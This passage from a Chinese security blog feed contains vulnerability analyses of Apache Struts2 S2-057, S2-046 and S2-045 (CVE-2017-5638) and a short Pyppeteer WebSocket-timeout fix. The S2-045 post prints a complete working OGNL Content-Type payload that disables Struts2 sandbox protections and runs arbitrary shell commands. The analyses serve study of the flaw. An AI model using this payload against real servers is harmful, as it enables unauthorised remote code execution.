alt=""></p><ul><li><p>之后为了我们构造的ognl表达式可以执行也就是执行到这四个触发点，我们需要在Struts2执行时让Struts2找到这些触发的action，而这就意味着我们需要修改<code>struts-actionchaining.xml</code>，而那里看这几个action的类型呢？——<code>struts-default.xml</code>(没找到漏洞作者说的Portlet的点)：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15457265552716.jpg" alt=""></p><p>  也就是说需要根据类型修改<code>struts-actionchaining.xml</code>，才能完成action的跳转。</p></li></ul><p>所以这也是为什么这个漏洞利用条件苛刻的原因。</p><h1 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h1><ul><li><a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2018-11776</a></li><li><a href="https://struts.apache.org/core-developers/namespace-configuration.html" target="_blank" rel="noopener">https://struts.apache.org/core-developers/namespace-configuration.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;S2-057的流程分析，该漏洞不好利用，但是整个调用流程是非常值得去研究的，跟一边后基本上对Struts2的执行流程就非常清楚了，关于POC将在后面一篇文章具体说明。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://lucifaer.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>S2-046（CVE-2017-5638）分析</title>
    <link href="https://lucifaer.com/2018/12/17/S2-046%EF%BC%88CVE-2017-5638%EF%BC%89%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/12/17/S2-046（CVE-2017-5638）分析/</id>
    <published>2018-12-17T10:00:00.000Z</published>
    <updated>2018-12-17T10:01:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>S2-046，是045的另外两个触发流程，分析起来还是很有趣的。</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><blockquote><p>Problem<br>It is possible to perform a RCE attack with a malicious Content-Disposition value or with improper Content-Length header. If the Content-Disposition / Content-Length value is not valid an exception is thrown which is then used to display an error message to a user. This is a different vector for the same vulnerability described in S2-045 (CVE-2017-5638).</p></blockquote><p>可以看到046是和045一样的触发点，只不过是利用方式不同，当构造一个<code>Content-Disposition</code>或一个错误的<code>Content-Length</code>时就有可能造成RCE，而造成ognl表达式执行的点还是在<code>Jakarta Multipart</code>解析器中。</p><p>总体来说046和045如出一辙，重复的<code>FileUploadInterceptor</code>文件上传拦截器就可以不用分析了，直接瞅瞅触发流程就好。</p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MultiPartRequestWrapper$MultiPartRequestWrapper:86 # 处理requests请求</span><br><span class="line">  JakartaMultiPartRequest$parse:67 # 处理上传请求，捕捉上传异常</span><br><span class="line">    JakartaMultiPartRequest$processUpload:96 # 解析请求</span><br><span class="line">      JakartaMultiPartRequest$processFileField:105 # 处理上传表单</span><br><span class="line">        DiskFileItem$getName:259 # 获取并检查上传文件名</span><br><span class="line">          Steams$checkFileName:189 # 上传文件名中存在空白字符，抛出异常</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>既然我们已经知道046的触发点和045的触发点是相同的，也就是说我们不需要重复去看<code>FileUploadInterceptor</code>执行ognl的过程了，我们只需要关注<code>FileUpload</code>这一部分的处理过程就好。</p><p>通过045我们知道ognl是通过报错信息传递的，而在046中，ongl也是通过这样的方法传递的。文件上传的过程中主要流程是在<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest</code>的<code>parse</code>方法中进行处理的，我们再来看看除了045的<code>Content-Type</code>外，哪里还能利用。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450321051901.jpg" alt=""></p><p>注意红框框的这两部分，一部分是处理上传请求参数并创建新的<code>upload item</code>，而另一部分是在经过表单校验后，如果为上传表单时会执行的方法。而前一个是045的利用电，后一个是046的一个利用方式，接下来分别说一下046的两个利用流。</p><h2 id="2-1-JakartaMultiPartRequest上传filename中存在空字符"><a href="#2-1-JakartaMultiPartRequest上传filename中存在空字符" class="headerlink" title="2.1 JakartaMultiPartRequest上传filename中存在空字符"></a>2.1 JakartaMultiPartRequest上传filename中存在空字符</h2><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450323713374.jpg" alt=""></p><p>可以看到首先会判断文件上传表单中是否没有给定文件名（即没有选择上传文件），跟进看一下<code>getName()</code>方法是如何校验文件名的:</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450325297242.jpg" alt=""></p><p>在继承关系中我们看到<code>getName()</code>在<code>org.apache.commons.fileupload.disk</code>中有具体的实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450326052768.jpg" alt=""></p><p>继续跟进<code>checkFileName()</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450326547107.jpg" alt=""></p><p>可以看到首先判断文件名是否存在，之后判断文件名中是否存在空字符，而在java中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450345931743.jpg" alt=""></p><p>这样是可以通过检测的，所以也就是说我们可以通过构造一个包含ognl表达式的<code>fileName</code>进入if判断中，并且抛出一个<code>InvalidFileNameException</code>的异常，同时经过处理后的<code>fileName</code>拼接进报错信息中。</p><p>回到最开始的<code>parse()</code>方法中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450347505252.jpg" alt=""></p><p>可以看到这里的异常处理直接把报错信息传入<code>buildErrorMessage()</code>中，剩下的流程就和045中是一样的，会直接执行报错信息中的ognl表达式。</p><h2 id="2-2-JakartaStreamMultiPartRequest上传长度过长"><a href="#2-2-JakartaStreamMultiPartRequest上传长度过长" class="headerlink" title="2.2 JakartaStreamMultiPartRequest上传长度过长"></a>2.2 JakartaStreamMultiPartRequest上传长度过长</h2><p>这一个利用流程的通用性比之上面的来说，就差很多，首先<code>JakartaStreamMultiPartRequest</code>的处理流默认是不开启的，为了测试漏洞的话，可以在struts.xml中主动配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.multipart.parser"</span> <span class="attr">value</span>=<span class="string">"jakarta-stream"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><code>JakartaStreamMultiPartRequest</code>的对<code>Content-Length</code>的异常处理和<code>JakartaMultiPartRequest</code>不同：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450377939315.jpg" alt=""></p><p>判断<code>Content-Length</code>是否符合标准的地方是：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450378659312.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450378857311.jpg" alt=""></p><p>如果超出了<code>maxSize</code>则会进入<code>addFileSkippedError()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450381417880.jpg" alt=""></p><p>可以看到会直接把<code>fileName</code>拼接进错误信息中，然后传到<code>buildErrorMessage()</code>中，执行错误信息中的ognl表达式。</p><p><strong>所以总体来说两种利用方式的关键是构造含有ognl表达式的<code>fileName</code></strong>。</p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>和045的poc没什么区别，可以参考<a href="https://gist.github.com/frohoff/a3e24764561c0c18b6270805140e7600" target="_blank" rel="noopener">poc</a>，最终的效果为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/17/15450403368998.jpg" alt=""></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-046" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-046</a></li><li><a href="https://gist.github.com/frohoff/a3e24764561c0c18b6270805140e7600" target="_blank" rel="noopener">https://gist.github.com/frohoff/a3e24764561c0c18b6270805140e7600</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;S2-046，是045的另外两个触发流程，分析起来还是很有趣的。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://lucifaer.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>如何解决Pyppeteer的Target closed错误</title>
    <link href="https://lucifaer.com/2018/12/14/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3Pyppeteer%E7%9A%84Target%20closed%E9%94%99%E8%AF%AF/"/>
    <id>https://lucifaer.com/2018/12/14/如何解决Pyppeteer的Target closed错误/</id>
    <published>2018-12-14T10:56:00.000Z</published>
    <updated>2018-12-14T11:01:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近写自己的Sniper遇到的一个问题，很有意思。</p><a id="more"></a><p>如果你之前用过Chrome Headless的话，你一定知道Chrome亲儿子<code>Puppeteer</code>——Chrome官方提供的Nodejs的API。比较难受的是官方并没有提供Python的API项目来让我等以Python为生的人享受良好的使用体验。所以如果有尝试过利用Python来写Chrome Headless项目的，一定会知道<code>Pyppeteer</code>这个第三方库。这篇文不说这个库怎么用（请看<code>Puppeteer</code>的文档），而是说在使用<code>Pyppeteer</code>进行页面交互时经常会出现的<code>Protocol error Target.activateTarget: Target closed.</code>错误的解决方案。</p><h1 id="什么时候会出现这个错误？"><a href="#什么时候会出现这个错误？" class="headerlink" title="什么时候会出现这个错误？"></a>什么时候会出现这个错误？</h1><p>简单来说，就是在利用<code>Pyppeteer</code>操作Chrome Headless执行js进行页面内容提取或交互时会出现这个错误。具体一点说，就是你在执行类似<code>page.screenshot()</code>、<code>page.evaluate()</code>这类操作的时候可能会出现这个问题，尤其是在你处理的页面过长，比如需要你执行惰性加载的页面过长时就会出现这个错误。</p><h1 id="出现问题的原因？"><a href="#出现问题的原因？" class="headerlink" title="出现问题的原因？"></a>出现问题的原因？</h1><p>无论<code>Pyppeteer</code>还是<code>Puppeteer</code>他们都是通过WebSocket来与Chrome Headless进行通讯的，也就是说整个连接的流程应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Internals&gt;Headless Blink&gt;Network&gt;WebSockets</span><br></pre></td></tr></table></figure><p>在本地，Chrome Headless相当于一个WebSocket服务器，而<code>Pyppeteer</code>和<code>Puppeteer</code>是用底层的WebSocket客户端与Chrome Headless进行通信，从而执行各种操作的。</p><p>WebSocket检查连接是否超时是通过ping连接是否超时来确定的，首先客户端向服务端发送ping请求，服务端处理请求并给客户端一个pong的响应，如果服务端无法处理ping请求，即不会向客户端发送pong响应，客户端就会断开和服务端的连接，而这就是出现这个问题的关键。</p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=865002" target="_blank" rel="noopener">Chrom Headless在今年报了一个bug</a>，简单来说就是Chrome Headless的WebSocket服务器无法处理ping请求，也就是处理ping时不会返回pong，这就导致客户端一定会在20s左右的时间断开与Chrome Headless的连接，所以会显示连接目标已经关闭的这个错误。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>目前还没有一个特别好的解决方案，比较好的解决方案是降低WebSocket评定连接断开的优先级，也就是让客户端不发送ping请求，这样至少会把断开的时间从20s延长至15分钟。</p><p><code>Pyppeteer</code>的解决方案，在github已经有人提出，但是patch并未合并到主分支上，所以需要自己本地改一下。<a href="https://github.com/miyakogi/pyppeteer/blob/master/pyppeteer/connection.py#L43" target="_blank" rel="noopener">#159</a></p><p>在<code>pyppeteer/pyppeteer/connection.py</code>的43行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self._ws = websockets.client.connect(</span><br><span class="line">            self._url, max_size=<span class="keyword">None</span>, loop=self._loop)</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/miyakogi/pyppeteer/pull/160" target="_blank" rel="noopener">https://github.com/miyakogi/pyppeteer/pull/160</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=865002" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=865002</a></li><li><a href="https://github.com/miyakogi/pyppeteer/issues/175" target="_blank" rel="noopener">https://github.com/miyakogi/pyppeteer/issues/175</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近写自己的Sniper遇到的一个问题，很有意思。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://lucifaer.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://lucifaer.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>S2-045（CVE-2017-5638）分析</title>
    <link href="https://lucifaer.com/2018/12/12/S2-045%EF%BC%88CVE-2017-5638%EF%BC%89%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/12/12/S2-045（CVE-2017-5638）分析/</id>
    <published>2018-12-12T08:35:00.000Z</published>
    <updated>2018-12-12T08:40:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>S2-045，一个很经典的漏洞，和网上已经有的分析不同，我将整个漏洞的触发点和流程全都理了一遍，感觉收获良多，算是能自己说服自己的分析了。</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><blockquote><p>Problem<br>It is possible to perform a RCE attack with a malicious Content-Type value. If the Content-Type value isn’t valid an exception is thrown which is then used to display an error message to a user.</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445108788424.jpg" alt="-w756"></p><p>从漏洞简述中可以得知是struts在处理<code>Content-Type</code>时如果获得未期预的值的话，将会爆出一个异常，在此异常的处理中可能会造成RCE。同时在漏洞的描述中可以得知Struts2在使用基于<code>Jakarta Multipart</code>解析器来处理文件上传时，可能会造成RCE。</p><p><code>Jakarta Multipart</code>解析器在Struts2中存在于<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest</code>是默认组件之一，首先把这一点记录下来。</p><p>接下来看一下diff：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445113437412.jpg" alt=""></p><p>可以看到关键点在于首先判断<code>validation</code>是否为空，若为空的话则跳过处理。可见关键点在于对于<code>validation</code>的处理。</p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">MultiPartRequestWrapper$MultiPartRequestWrapper:86 # 处理requests请求</span><br><span class="line">  JakartaMultiPartRequest$parse:67 # 处理上传请求，捕捉上传异常</span><br><span class="line">    JakartaMultiPartRequest$processUpload:91 # 解析请求</span><br><span class="line">      JakartaMultiPartRequest$parseRequest:147 # 创建请求报文解析器，解析上传请求</span><br><span class="line">        JakartaMultiPartRequest$createRequestContext # 实例化报文解析器</span><br><span class="line">      FileUploadBase$parseRequest:334 # 处理符合multipart/form-data的流数据</span><br><span class="line">        FileUploadBase$FileItemIteratorImpl:945 # 抛出ContentType错误的异常，并把错误的ContentType添加到报错信息中</span><br><span class="line">  JakartaMultiPartRequest$parse:68 # 处理文件上传异常</span><br><span class="line">    AbstractMultiPartRequest$buildErrorMessage:102 # 构建错误信息</span><br><span class="line">      LocalizedMessage$LocalizedMessage:35 # 构造函数赋值</span><br><span class="line">FileUploadInterceptor$intercept:264 # 进入文件上传处理流程，处理文件上传报错信息</span><br><span class="line">  LocalizedTextUtil$findText:391 # 查找本地化文本消息</span><br><span class="line">  LocalizedTextUtil$findText:573 # 获取默认消息</span><br><span class="line">    # 以下为ognl表达式的提取与执行过程</span><br><span class="line">    LocalizedTextUtil$getDefaultMessage:<span class="number">729</span></span><br><span class="line">      TextParseUtil$translateVariables:<span class="number">44</span></span><br><span class="line">        TextParseUtil$translateVariables:<span class="number">122</span></span><br><span class="line">          TextParseUtil$translateVariables:<span class="number">166</span></span><br><span class="line">            TextParser$evaluate:<span class="number">11</span></span><br><span class="line">            OgnlTextParser$evaluate:<span class="number">10</span></span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="2-1-漏洞触发点"><a href="#2-1-漏洞触发点" class="headerlink" title="2.1 漏洞触发点"></a>2.1 漏洞触发点</h2><p>根据diff所得结果，跟进<code>validation</code>的执行流程，就如漏洞描述中所述，<code>validation</code>的调用位于Struts2的<code>FileUploadInterceptor</code>也就是处理文件上传的拦截器中。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445122026554.jpg" alt=""></p><p>跟进<code>LocalizedTextUtil.findText</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445123304440.jpg" alt=""></p><p>这边先不着急向下跟，首先看一下<code>valueStack</code>的内容是什么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445123822699.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445124084601.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445124242258.jpg" alt=""></p><p>通过键值关系从<code>ActionContext</code>中返回ognl的堆栈结构，也就是说<code>valueStack</code>和ognl的执行相关。</p><p>接下来跟进<code>findText</code>方法，着重跟一下<code>valueStack</code>，可以发现主要是以下方法调用到该值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">findMessage()</span><br><span class="line">getMessage()</span><br><span class="line">getDefaultMessage()</span><br><span class="line">ReflectionProviderFactory.getInstance().getRealTarget()</span><br></pre></td></tr></table></figure><p>先不管<code>ReflectionProviderFactory.getInstance().getRealTarget()</code>，<code>findMessage()</code>在执行过程中都会调用到<code>getMessage()</code>，而在<code>getMessage()</code>和<code>getDefaultMessage()</code>中都存在<code>buildMessageFormat()</code>方法，该方法用于消息的格式化，而格式化的消息是由<code>TextParseUtil.translateVariables()</code>来生成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445168312615.jpg" alt=""></p><p>这里注意<code>getMessage()</code>方法需要设置<code>bundleName</code>这个参数，而这个参数是由<code>aClass</code>赋值的，而在整个触发流程中<code>aClass</code>是一个<code>File</code>异常类，而这个类在<code>Collections.java</code>中是找不到的，所以在执行过程中，所有的<code>getMessage()</code>和<code>findMessage()</code>都是返回<code>null</code>的，也就是说，在整个流程中，只有<code>getDefaultMessage()</code>会被触发。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445168750161.jpg" alt=""></p><p>跟一下这个<code>TextParseUtil.translateVariables()</code>的具体实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445169246963.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445169778888.jpg" alt=""></p><p>可以看到首先对<code>defaultMessage</code>进行ognl表达式的提取，之后执行ognl表达式。所以漏洞的触发点就找到了。且触发的关键是构造一个含有ognl表达式的<code>defaultMessage</code>即：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445870135891.jpg" alt=""></p><h2 id="2-2-触发流程"><a href="#2-2-触发流程" class="headerlink" title="2.2 触发流程"></a>2.2 触发流程</h2><p>网上很多文章并没有说该漏洞的触发流程是什么样的，只是在上面的关键点下了一个断向下调试，所以只是完成了对这个流程的调试而已，并没有完整的把这个漏洞说清楚的原因（浮躁的圈子= =）。</p><p>我记录一下我<strong>根据单元测试</strong>而找到触发流程的过程。</p><p>根据2.1的分析，我们现在知道只要调用了<code>org.apache.struts2.interceptor.FileUploadInterceptor$intercept</code>且<code>request</code>触发错误处理流程，且<code>validation</code>不为空就可以触发ognl表达式的执行。所以首先我开始寻找哪里调用了<code>intercept()</code>这个方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445810409990.jpg" alt=""></p><p>如上图红框的内容，我找到了针对于<code>FileUploadInterceptor</code>的单元测试，在单元测试中详尽的描述了<code>intercept()</code>的处理流程，跟进看一下我找到了一个有趣的单元测试<code>testInvalidContentTypeMultipartRequest()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445815696993.jpg" alt=""></p><p>还记得我们的<code>intercept</code>的处理流程么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445816485991.jpg" alt=""></p><p>也就是说我们需要关心的只有<strong>MyFileupAction()与request的处理流程</strong>。</p><p>首先来看一下<code>MyFileupAction()</code>是否是<code>ValidationAware</code>接口的一个实例：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445818933568.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445819092552.jpg" alt=""></p><p>ok，是<code>ValidationAware</code>一个实现，<code>getAction()</code>方法将<code>setAction()</code>设置的对象返回。接下来我们跟一下<code>req</code>的处理流程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-&gt; createMultipartRequest(req, 2000)</span><br><span class="line">-&gt; new MultiPartRequestWrapper(jak, req, tempDir.getAbsolutePath(), new DefaultLocaleProvider())</span><br><span class="line">-&gt; this(multiPartRequest, request, saveDir, provider, false);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445826642665.jpg" alt=""></p><p>关键点在于<code>multi.parse(request, saveDir);</code>根据调用栈，可以看到这里是调用了<code>JakartaMultiPartRequest</code>实例的<code>parse()</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445833384827.jpg" alt=""></p><p>这里注意会捕获<code>FileUploadException</code>异常。</p><p>接着跟进<code>processUpload()</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445833808692.jpg" alt=""></p><p>继续跟进：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445834087441.jpg" alt=""></p><p>首先看<code>createRequestContext()</code>对于请求做了哪些处理：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445834685948.jpg" alt=""></p><p>返回了一个实例化的<code>RequestContext()</code>，记住该实例有四个内置的方法：</p><ul><li>getCharacterEncoding()</li><li>getContentType()</li><li>getContentLength()</li><li>getInputStream()</li></ul><p>接着跟进<code>parseRequest()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445836799663.jpg" alt=""></p><p>跟进<code>getItemIterator()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445837499576.jpg" alt=""></p><p>继续跟进：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445837797094.jpg" alt=""></p><p>这一段代码首先调用了<code>RequestContext</code>实例的<code>getContentType()</code>方法，该方法就像上面调用栈中所看到的一样，会返回请求的<code>ContentType</code>字段，然后做一个存在性校验，校验<code>ContentType</code>是否为空或并非以<code>multipart</code>开头，如果上述条件成立，则抛出一个错误，并把错误的<code>ContentType</code>加入到报错信息中。这里的<code>InvalidContentTypeException</code>类是继承于<code>FileUploadException</code>的，也就是说会抛出一个<code>FileUploadException</code>的错误。</p><p>反过来看<code>JakartaMultiPartRequest</code>的异常捕获逻辑：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445842861699.jpg" alt=""></p><p>很有意思，我们直接跟进<code>buildErrorMessage</code>看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445844578180.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445847527207.jpg" alt=""></p><p>可以看到在这里，我们将包含着我们可以自定义的<code>ContentType</code>赋值给<code>defaultMessage</code>回看2.1所说的漏洞触发点，这里就是我们发送请求将ognl传递到漏洞触发点的<code>defaultMessage</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445849716255.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445852116856.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445852825484.jpg" alt=""></p><p>拆分消息中的ognl表达式，并执行：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445853082722.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445853186223.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445854416645.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445855256634.jpg" alt=""></p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>根据上面的分析，我们可以看到构造POC的关键是在发送的请求中构造一个含有ongl表达式的<code>ContentType</code>。较为通用的一个poc如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;open /Applications/Calculator.app&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15446033184238.jpg" alt=""></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-045</a></li><li><a href="https://www.easyaq.com/news/250515148.shtml" target="_blank" rel="noopener">https://www.easyaq.com/news/250515148.shtml</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;S2-045，一个很经典的漏洞，和网上已经有的分析不同，我将整个漏洞的触发点和流程全都理了一遍，感觉收获良多，算是能自己说服自己的分析了。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://lucifaer.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>RF-14310（CVE-2018-12533）分析</title>
    <link href="https://lucifaer.com/2018/12/05/RF-14310%EF%BC%88CVE-2018-12533%EF%BC%89%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/12/05/RF-14310（CVE-2018-12533）分析/</id>
    <published>2018-12-05T07:33:00.000Z</published>
    <updated>2018-12-12T08:38:29.000Z</updated>
    
